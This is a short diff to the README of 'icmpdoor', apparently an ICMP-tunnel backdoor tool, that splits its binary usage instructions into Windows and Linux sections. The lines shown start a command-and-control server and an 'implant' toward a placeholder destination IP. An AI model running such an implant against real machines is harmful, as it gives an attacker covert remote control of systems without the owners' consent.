@@ -9,11 +9,13 @@ Python version usage (both Windows and Linux):
 ./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
 ```
 
-Binary version usage version:
+Binary Windows version usage version:
 ```bash
 ./icmp-cnc.exe -d DESTINATION_IP (Command and Control)
 ./icmpdoor.exe -d DESTINATION_IP (Implant)
 ```
+
+Binary Linux version usage version:
 ```bash
 ./icmp-cnc -d DESTINATION_IP (Command and Control)
 ./icmpdoor -d DESTINATION_IP (Implant)
